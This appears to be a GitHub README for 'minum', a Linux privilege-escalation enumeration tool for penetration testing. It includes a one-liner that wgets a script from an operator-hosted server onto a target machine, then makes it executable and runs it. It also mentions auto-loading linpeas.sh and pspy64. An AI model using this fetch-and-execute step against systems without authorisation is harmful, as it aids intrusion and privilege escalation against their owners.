# minum : Minimal Enumeration Tool

This enumeration for privilege escalation tool, unlike many others, is built towards the idea of finding the top most relevant privilege escalation vectors for its user.  
The idea is to prevent throwing a lot of things at the user and let him begin searching for a needle in a haystack.  

Instead, it will ask you for your preferable routes throughout its running and will present to the user only the interesting stuff.
Letting you spend more time on exploiting and less time on reading tons of text all over the place.  
At the end it will also load for you linpeas.sh automatically in case you want an indepth lookout.  

Have fun, and use my tool for good purposes! Educational purposes ONLY !!

P.S

Have some suggestions? Leave an issue and we will be able to look at it and make modifications.

Cheers!

## Install
On your local machine:
```
git clone https://github.com/nirzaaa/minum.git
cd minum
python -m http.server
```
p.s.  
Pay attention to play `linpeas.sh` and `pspy64` in that folder so we will be able to download it for you automatically :)

On the remote machine:
```
wget <my_ip>:<my_port>/minlinum.sh; chmod +x minlinum.sh; ./minlinum.sh
```

## Usage

You can download the script to the remote machine and run it for you automatically by using:  
`wget <my_ip>:<my_port>/minlinum.sh; chmod +x minlinum.sh; ./minlinum.sh`

## Suggestions
Have any suggestions? Something is missing? (:grimacing:) You can leave us an issue and we will look into it :smiley:

## Support us
[![name]()](link to your URL)
![68747470733a2f2f63646e2e6275796d6561636f666665652e636f6d2f627574746f6e732f64656661756c742d6f72616e67652e706e67](https://user-images.githubusercontent.com/117816100/206116650-916f11c0-bacb-4578-b8f7-7048ff363d00.png)

